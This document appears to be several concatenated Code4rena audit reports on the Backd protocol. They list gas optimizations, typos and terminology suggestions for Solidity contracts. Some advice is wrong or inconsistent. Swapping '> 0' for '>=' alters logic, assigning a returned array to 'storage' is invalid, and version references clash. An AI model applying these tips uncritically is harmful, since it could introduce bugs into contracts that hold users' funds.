## C4-001: Revert String Size Optimization ## C4-002 : Adding unchecked directive can save gas ## C4-003 : Check if amount > 0 before token transfer can save gas ## C4-004 : There is no need to assign default values to variables ## C4-005 : Free gas savings for using solidity 0.8.10+ ## C4-006 : Using operator && used more gas ## C4-007 : Non-strict inequalities are cheaper than strict ones ## C4-008 : Use Custom Errors instead of Revert Strings to save Gas ## C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible ## C4-010 : Cache array length in for loops can save gas ## C4-011 : State Variables that can be changed to immutable ## C4-012 : Use calldata instead of memory for function parameters   # C4-001: Revert String Size Optimization  ## Impact  Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   ## Proof of Concept  Revert strings > 32 bytes are here:  ```   ../2022-05-backd-main/protocol/libraries/Errors.sol::11 => string internal constant CONTRACT_INITIALIZED = "contract can only be initialized once";   ../2022-05-backd-main/protocol/libraries/Errors.sol::18 => string internal constant INVALID_TOKEN = "token address does not match pool's LP token address";   ../2022-05-backd-main/protocol/libraries/Errors.sol::21 => string internal constant INVALID_PARAMETER_VALUE = "invalid parameter value attempted";   ../2022-05-backd-main/protocol/libraries/Errors.sol::22 => string internal constant INVALID_IMPLEMENTATION = "invalid pool implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::24 => "invalid pool implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::26 => "invalid LP Token implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::28 => "invalid vault implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::30 => "invalid stakerVault implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::33 => string internal constant INSUFFICIENT_AMOUNT_OUT = "Amount received less than min amount";   ../2022-05-backd-main/protocol/libraries/Errors.sol::34 => string internal constant INSUFFICIENT_AMOUNT_IN = "Amount spent more than max amount";   ../2022-05-backd-main/protocol/libraries/Errors.sol::47 => string internal constant THRESHOLD_TOO_HIGH = "threshold is too high, must be under 10";   ../2022-05-backd-main/protocol/libraries/Errors.sol::51 => string internal constant CANNOT_EXECUTE_IN_SAME_BLOCK = "cannot execute action in same block";   ../2022-05-backd-main/protocol/libraries/Errors.sol::57 => "not enough funds were withdrawn from the pool";   ../2022-05-backd-main/protocol/libraries/Errors.sol::63 => string internal constant ERC20_BALANCE_EXCEEDED = "ERC20: transfer amount exceeds balance";   ../2022-05-backd-main/protocol/libraries/Errors.sol::65 => "the minter address of the LP token and the pool address do not match";   ../2022-05-backd-main/protocol/libraries/Errors.sol::66 => string internal constant STAKER_VAULT_EXISTS = "a staker vault already exists for the token";   ../2022-05-backd-main/protocol/libraries/Errors.sol::70 => string internal constant DEADLINE_NOT_REACHED = "deadline has not been reached yet";   ../2022-05-backd-main/protocol/libraries/Errors.sol::73 => "insufficient funds for updating the position";   ../2022-05-backd-main/protocol/libraries/Errors.sol::74 => string internal constant SAME_AS_CURRENT = "value must be different to existing value";   ../2022-05-backd-main/protocol/libraries/Errors.sol::80 => string internal constant ESTIMATED_GAS_TOO_HIGH = "too much ETH will be used for gas";   ../2022-05-backd-main/protocol/libraries/Errors.sol::84 => string internal constant GAS_BANK_BALANCE_TOO_LOW = "not enough ETH in gas bank to cover gas";   ../2022-05-backd-main/protocol/libraries/Errors.sol::89 => "pool does not support additional underlying coins to be withdrawn";   ../2022-05-backd-main/protocol/libraries/Errors.sol::95 => string internal constant TOKEN_NOT_USABLE = "token not usable for the specific action";   ../2022-05-backd-main/protocol/libraries/Errors.sol::99 => string internal constant POOL_NOT_PAUSED = "Pool must be paused to withdraw from reserve";   ../2022-05-backd-main/protocol/libraries/Errors.sol::100 => string internal constant INTERACTION_LIMIT = "Max of one deposit and withdraw per block";   ../2022-05-backd-main/protocol/libraries/Errors.sol::103 => string internal constant EXCEEDS_MAX_BOOST = "Not allowed to exceed maximum boost on Convex";   ../2022-05-backd-main/protocol/libraries/Errors.sol::105 => "Cannot relock funds when withdrawal is being prepared"; ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Shorten the revert strings to fit in 32 bytes. That will affect gas optimization.  # C4-002 : Adding unchecked directive can save gas  ## Impact  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  ## Proof of Concept  ```   ../2022-05-backd-main/protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider applying unchecked arithmetic where overflow/underflow is not possible. Example can be seen from below.  ``` Unchecked{i++}; ```  # C4-003 : Check if amount > 0 before token transfer can save gas  ## Impact  Since _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.  ## Proof of Concept  ``` ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( ./protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ./protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); ./protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token ./protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); ./protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider checking amount != 0.  # C4-004 : There is no need to assign default values to variables  ## Impact -  Gas Optimization  Boolean is default initialized to false. There is no need assign false to variable.   ## Proof of Concept  ```   protocol/contracts/tokenomics/InflationManager.sol::412 => bool keeperGaugeExists = false;   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  bool x = false costs more gas than bool x without having any different functionality.   # C4-005 : Free gas savings for using solidity 0.8.13+  ## Impact  Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  ## Proof of Concept  ``` All Contracts ```   Solidity 0.8.14 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/  Solidity 0.8.13 has some improvements too but not well tested.  Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to upgrade pragma to at least 0.8.13.   # C4-006 : Using operator && used more gas  ## Impact  Using double require instead of operator && can save more gas.  ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:73:        if (amount <= 0 && crvAmount <= 0 && cvxAmount <= 0) return 0; protocol/contracts/tokenomics/AmmConvexGauge.sol:107:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/AmmConvexGauge.sol:129:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/InflationManager.sol:420:        if (!keeperGaugeExists && weightBasedKeeperDistributionDeactivated && length >= 1) { protocol/contracts/tokenomics/InflationManager.sol:426:        if (exists && !IKeeperGauge(keeperGauge).killed()) { protocol/contracts/tokenomics/AmmGauge.sol:88:        if (!killed && totalStaked > 0) {   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Example  ```  using &&:  function check(uint x)public view{ require(x == 0 && x < 1 ); } // gas cost 21630  using double require:  require(x == 0 ); require( x < 1); } } // gas cost 21622 ```   # C4-007 : Non-strict inequalities are cheaper than strict ones  ## Impact  Strict inequalities add a check of non equality which costs around 3 gas.  ## Proof of Concept  ```   protocol/contracts/BkdLocker.sol::91 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/BkdLocker.sol::92 => require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   protocol/contracts/BkdLocker.sol::137 => require(length > 0, "No entries");   protocol/contracts/BkdLocker.sol::139 => while (i > 0) {   protocol/contracts/BkdLocker.sol::254 => if (userBalance > 0) {   protocol/contracts/BkdLocker.sol::301 => if (userBalance > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::174 => if (cvxcrvBal > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::268 => if (IERC20(CVX_CRV).balanceOf(address(this)) > 0)   protocol/contracts/LpToken.sol::87 => if (amount > 0) ILiquidityPool(minter).handleLpTokenTransfer(from, to, amount); // add check to not break 0 transfers   protocol/contracts/RewardHandler.sol::63 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::57 => if (depositAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::67 => if (lockAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::103 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::214 => require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/actions/topup/TopUpAction.sol::535 => require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/actions/topup/TopUpAction.sol::655 => if (position.depositTokenBalance > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::866 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpActionFeeHandler.sol::123 => require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);   protocol/contracts/actions/topup/handlers/AaveHandler.sol::62 => if (variableDebt + stableDebt > 0) {   protocol/contracts/actions/topup/handlers/AaveHandler.sol::84 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/handlers/CompoundHandler.sol::137 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/pool/LiquidityPool.sol::469 => require(underlyingAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::471 => require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/pool/LiquidityPool.sol::514 => require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::538 => require(redeemLpTokens > 0, Error.INVALID_AMOUNT);   protocol/contracts/strategies/BkdEthCvx.sol::105 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdEthCvx.sol::111 => if (lpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::154 => if (underlyingBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::162 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::214 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::361 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::367 => if (lpBalance > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::410 => if (cvxCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::413 => if (cvxBalance_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::421 => if (crvCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::424 => if (crvBalance_ > 0) {   protocol/contracts/swappers/SwapperRouter.sol::264 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/testing/MockErc20Strategy.sol::64 => require(currentBalance > 0, "Invalid amount to withdraw");   protocol/contracts/testing/MockErc20Strategy.sol::74 => require(amount > 0, "Invalid amount to transfer");   protocol/contracts/testing/MockEthStrategy.sol::65 => require(currentBalance > 0, "Invalid amount to withdraw");   protocol/contracts/testing/MockVotingEscrow.sol::35 => require(_balances[msg.sender] > 0, "a lock needs to first be created");   protocol/contracts/tokenomics/AmmConvexGauge.sol::107 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::129 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::158 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::171 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::197 => if (totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::88 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::104 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::125 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::147 => if (totalStaked > 0) {   protocol/contracts/tokenomics/FeeBurner.sol::117 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/tokenomics/InflationManager.sol::575 => totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::589 => totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::602 => totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;   protocol/contracts/tokenomics/KeeperGauge.sol::140 => require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);   protocol/contracts/tokenomics/LpGauge.sol::68 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/LpGauge.sol::114 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/VestedEscrow.sol::84 => require(unallocatedSupply > 0, "No reward tokens in contract");   protocol/contracts/vault/Vault.sol::163 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/vault/Vault.sol::231 => if (remainingStrategyBalance > 0) {   protocol/contracts/vault/Vault.sol::466 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::609 => if (currentDebt > 0) {   protocol/contracts/vault/Vault.sol::638 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::711 => if (govShare > 0) {   protocol/contracts/vault/Vault.sol::727 => } else if (underlyingReserves > 0) { ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Use >= or <= instead of > and < when possible.   # C4-008 : Use Custom Errors instead of Revert Strings to save Gas   Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Instances include:  All require Statements  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Recommended to replace revert strings with custom errors.   # C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible  ## Impact  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## Proof of Concept  Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.    # C4-010 : Cache array length in for loops can save gas  ## Impact  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  ## Proof of Concept  1. Navigate to the following smart contract line.  ```   protocol/contracts/tokenomics/InflationManager.sol::116 => for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {   protocol/contracts/tokenomics/VestedEscrow.sol::94 => for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {   protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {   protocol/contracts/zaps/PoolMigrationZap.sol::39 => for (uint256 i; i < oldPoolAddresses_.length; ) {   protocol/libraries/EnumerableExtensions.sol::19 => uint256 len = addresses.length();  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to cache array length.   # C4-011 : State Variables that can be changed to immutable   ## Impact  Solidity 0.6.5 introduced immutable as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage.  Consider the following generic example:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public owner = msg.sender; } ```  In the above example, each call to the function owner() reads from storage, using a sload. After EIP-2929, this costs 2100 gas cold or 100 gas warm. However, the following snippet is more gas efficient:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public immutable owner = msg.sender; } ```  In the above example, each storage read of the owner state variable is replaced by the instruction push32 value, where value is set during contract construction time. Unlike the last example, this costs only 3 gas.  ## Proof of Concept  1. Navigate to the following smart contract line.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L39 ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider using immutable variable.    # C4-012 : Use calldata instead of memory for function parameters  ## Impact   In some cases, having function arguments in calldata instead of memory is more optimal.  Consider the following generic example:  ``` contract C {    function add(uint[] memory arr) external returns (uint sum) {        uint length = arr.length;        for (uint i = 0; i < arr.length; i++) {            sum += arr[i];        }    } } ```  In the above example, the dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload. However, for the above example this is inefficient. Consider the following snippet instead:  ``` contract C {    function add(uint[] calldata arr) external returns (uint sum) {        uint length = arr.length;        for (uint i = 0; i < arr.length; i++) {            sum += arr[i];        }    } } ```  In the above snippet, instead of going via memory, the value is directly read from calldata using calldataload. That is, there are no intermediate memory operations that carries this value.  Gas savings: In the former example, the ABI decoding begins with copying value from calldata to memory in a for loop. Each iteration would cost at least 60 gas. In the latter example, this can be completely avoided. This will also reduce the number of instructions and therefore reduces the deploy time cost of the contract.  In short, use calldata instead of memory if the function argument is only read.  Note that in older Solidity versions, changing some function arguments from memory to calldata may cause "unimplemented feature error". This can be avoided by using a newer (0.8.*) Solidity compiler.   ## Proof of Concept  1. Navigate to the following smart contract line.  ``` protocol/contracts/tokenomics/FeeBurner.sol:43:    function burnToTarget(address[] memory tokens_, address targetLpToken_)  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Some parameters in examples given above are later hashed. It may be beneficial for those parameters to be in memory rather than calldata.
### Unchecked Gas Optimisation in Minter.sol A check is already made to make sure that `issuedNonInflationSupply` does not exceed a certain value so an arithmetic overflow is not possible  Change `issuedNonInflationSupply += amount;` to `unchecked { issuedNonInflationSupply += amount;} `  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L154  ### Unchecked Gas Optimisations in AmmGauge.sol We can make another unchecked addition because `totalStaked` will always be larger than `balances[user]`  Change ``` balances[account] += staked; totalStaked += staked; ```  to ``` totalStaked += staked; unchecked { balances[account] += staked; }  ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L112-L113  In Line 134 and 135 Change ``` balances[msg.sender] -= unstaked; totalStaked -= unstaked; ``` to  ``` balances[msg.sender] -= unstaked; unchecked { totalStaked -= unstaked } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L134-L135  ### KeeperGauge.sol Change `epoch++` to `++epoch` as talked about [here](https://www.reddit.com/r/ethdev/comments/tcwspw/i_vs_i_gas_efficiency/) https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98  Change ```         keeperRecords[beneficiary].feesInPeriod[epoch] += amount;         perPeriodTotalFees[epoch] += amount; ``` to ```         perPeriodTotalFees[epoch] += amount;         unchecked { keeperRecords[beneficiary].feesInPeriod[epoch] += amount; }          ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87-L88  # BkdLocker.sol As we already make a value check we do not need to worry about arithmetic overflow Wrap `unchecked` around ```         totalStashed[msg.sender] += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L119-L123  Again we have a similar issue  Change ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         totalLocked -= totalAvailableToWithdraw; ``` to ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         unchecked { totalLocked -= totalAvailableToWithdraw; } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L149-L152  `curRewardTokenData.feeBalance` will always be larger than or equal to `curRewardTokenData.userShares[msg.sender]` of any user so we can change Line 216 to `unchecked { curRewardTokenData.feeBalance -= claimable; }`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L214-L216  ### Gas Savings in `_userCheckpoint()` in `BkdLocker.sol` Contract Variables such as `boostFactors` and `curRewardTokenData` are read multiple times throughout the contract. This requires multiple SLOAD operations which are very expensive. It is better to load the variables into memory and use those when reading while the storage variables can be used for writing.  See [here](https://dev.to/javier123454321/solidity-gas-optimization-pt1-4271) for more info i.e. ```                RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (curRewardTokenData.feeIntegral -                 curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 );  ``` can be changed to ```         RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];         RewardTokenData memory _curRewardTokenData = curRewardTokenData           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (_curRewardTokenData.feeIntegral -                 _curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 ); ```  This also applies to `boostFactors` and `prevRewardTokenData`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L335  
#1 Memory to storage  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L54  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L41  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L21  use storage instead of memory can reduce the gas. i suggest to change          address[] memory pools = addressProvider.allPools(); to          address[] storage pools = addressProvider.allPools(); apply to others  #2 Use memory instead calldata  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L124  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L59  In the external functions where the function argument is read-only, the function() has an inputed parameter that using memory, if this function didnt change the parameter, its cheaper to use calldata then memory. so we suggest to change it.      function burnToTarget(address[] memory tokens_, address targetLpToken_) to      function burnToTarget(address[] calldata tokens_, address targetLpToken_) apply to others.  #3 use != 0 instead of >0   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137  for unsigned integer, >0 is less efficient then !=0, so use !=0 instead of >0. do to all line code.  #4 Caching lpgauge  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L161-L162              ILpGauge(lpGauge).userCheckpoint(src);             ILpGauge(lpGauge).userCheckpoint(dst); to the memory for reduce the gas fee because it use multiple times.  #5 Pre increment  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59  using pre increment more cheaper than post increment. so, i sugget to change           epoch++; to          ++epoch;  #6 change string to bytes32  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L152  reduce size of error message can reduce the gas fee. i suggest to convert string to bytes32  #7 Caching the length  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  caching the array length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity.
Typos   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237 ```solidity      * @param key Key to feeze ``` Change `feeze` to `freeze`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173 ```solidity      * @dev This does not invlude the gov. tokens queued for withdrawal. ``` Change `invlude` to `include`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29 ```solidity     event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ``` Change `Emmited` to `Emitted`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35 ```solidity     receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` Change `Recieve` to `Receive`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L84 ```solidity         // Transfering LP tokens back to sender ``` Change `Transfering` to `Transferring`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ``` Change `TOOD` to `TODO`   Issue: `Require` error message typo  Explanation: Messages should provide clear information for users to understand reason for failure  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L29 ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `delay be at least 3 days` to `delay must be at least 3 days`   Issue: Sensitive terms in both the comments and the code should be updated  Explanation: Terms incorporating "white," "black," "master" or "slave" are potentially problematic. Substituting more neutral terminology is becoming [common practice](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/)   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L336 ```solidity      * @param strategyPool The pool of the strategy to register (avoids blacklisting other addresses). ``` Suggestion: Change `blacklisting` to `denylisting`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L64 ```solidity         require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); ``` Suggestion: Change 'whitelisted' to 'allowlisted' in each case   Similarly for the following instances of 'whitelist' and its variations:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L36  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L65  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L71-L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L302  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L51  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L452  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L79-L80   Issue: TODOs that have not been addressed Explanation: Open TODOs should be worked through and removed  